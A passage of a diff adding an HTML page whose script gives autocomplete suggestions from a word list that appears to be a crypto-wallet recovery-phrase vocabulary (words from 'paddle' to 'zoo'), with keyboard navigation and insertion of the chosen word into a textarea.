+        "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper",
+        "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol",
+        "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen",
+        "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo",
+        "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot",
+        "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate",
+        "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar",
+        "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post",
+        "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare",
+        "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private",
+        "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property",
+        "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin",
+        "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle",
+        "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit",
+        "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp",
+        "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor",
+        "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle",
+        "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release",
+        "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen",
+        "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response",
+        "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib",
+        "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot",
+        "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket",
+        "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal",
+        "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness",
+        "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand",
+        "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter",
+        "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script",
+        "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed",
+        "seek", "segment", "select", "sell", "sember", "send", "senior", "sense", "sentence", "series",
+        "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed",
+        "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot",
+        "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick",
+        "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple",
+        "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski",
+        "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide",
+        "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke",
+        "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock",
+        "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon",
+        "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial",
+        "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike",
+        "spin", "spirit", "split", "spoiler", "sponsor", "spoon", "sport", "spot", "spray", "spread",
+        "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs",
+        "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo",
+        "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy",
+        "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit",
+        "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun",
+        "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround",
+        "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift",
+        "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle",
+        "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo",
+        "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test",
+        "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this",
+        "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt",
+        "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today",
+        "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight",
+        "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total",
+        "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train",
+        "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe",
+        "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet",
+        "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn",
+        "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly",
+        "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy",
+        "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update",
+        "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used",
+        "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve",
+        "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture",
+        "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious",
+        "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit",
+        "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage",
+        "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior",
+        "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel",
+        "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what",
+        "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild",
+        "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom",
+        "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work",
+        "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard",
+        "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
+      ];
+
+      let currentFocus = -1;
+
+      function closeSuggestions() {
+        listDiv.innerHTML = "";
+        listDiv.style.display = "none";
+        currentFocus = -1;
+      }
+
+      function createSuggestionItem(word) {
+        const div = document.createElement("div");
+        div.textContent = word;
+        div.addEventListener("mousedown", function(e) {
+          e.preventDefault();
+          insertWordAtCursor(textarea, word);
+          closeSuggestions();
+        });
+        return div;
+      }
+
+      function addActive(items) {
+        if (!items) return false;
+        removeActive(items);
+        if (currentFocus >= items.length) currentFocus = 0;
+        if (currentFocus < 0) currentFocus = items.length - 1;
+        items[currentFocus].classList.add("autocomplete-active");
+      }
+
+      function removeActive(items) {
+        for (const item of items) {
+          item.classList.remove("autocomplete-active");
+        }
+      }
+
+      function insertWordAtCursor(textarea, word) {
+        const start = textarea.selectionStart;
+        const end = textarea.selectionEnd;
+        const value = textarea.value;
+        let wordStart = start;
+        while (wordStart > 0 && !/\s/.test(value[wordStart - 1])) {
+          wordStart--;
+        }
+        const before = value.substring(0, wordStart);
+        const after = value.substring(end);
+        textarea.value = before + word + after;
+        const newPos = wordStart + word.length;
+        textarea.setSelectionRange(newPos, newPos);
+        textarea.focus();
+      }
+
+      textarea.addEventListener("input", function() {
+        const inputVal = textarea.value;
+        const cursorPos = textarea.selectionStart;
+        let wordStart = cursorPos;
+        while (wordStart > 0 && !/\s/.test(inputVal[wordStart - 1])) {
+          wordStart--;
+        }
+        const partialWord = inputVal.substring(wordStart, cursorPos).toLowerCase();
+        closeSuggestions();
+        if (partialWord.length === 0) return;
+        const filtered = suggestions.filter(word =>
+          word.toLowerCase().startsWith(partialWord)
+        );
+        if (filtered.length === 0) return;
+        listDiv.style.display = "flex";
+        filtered.slice(0, 4).forEach(word => {
+          const item = createSuggestionItem(word);
+          listDiv.appendChild(item);
+        });
+      });
+
+      textarea.addEventListener("keydown", function(e) {
+        let items = listDiv.querySelectorAll("div");
+        if (listDiv.style.display === "none") return;
+        if (e.key === "ArrowRight" || e.key === "ArrowDown") {
+          e.preventDefault();
+          currentFocus++;
+          addActive(items);
+        } else if (e.key === "ArrowLeft" || e.key === "ArrowUp") {
+          e.preventDefault();
+          currentFocus--;
+          addActive(items);
+        } else if (e.key === "Enter") {
+          if (currentFocus > -1) {
+            e.preventDefault();
+            if (items[currentFocus]) {
+              items[currentFocus].dispatchEvent(new Event("mousedown"));
+            }
+          }
+        } else if (e.key === "Escape") {
+          closeSuggestions();
+        }
+      });
+
+      textarea.addEventListener("blur", () => {
+        setTimeout(closeSuggestions, 150);
+      });
+    })();
+  </script>
+</body>
+</html>
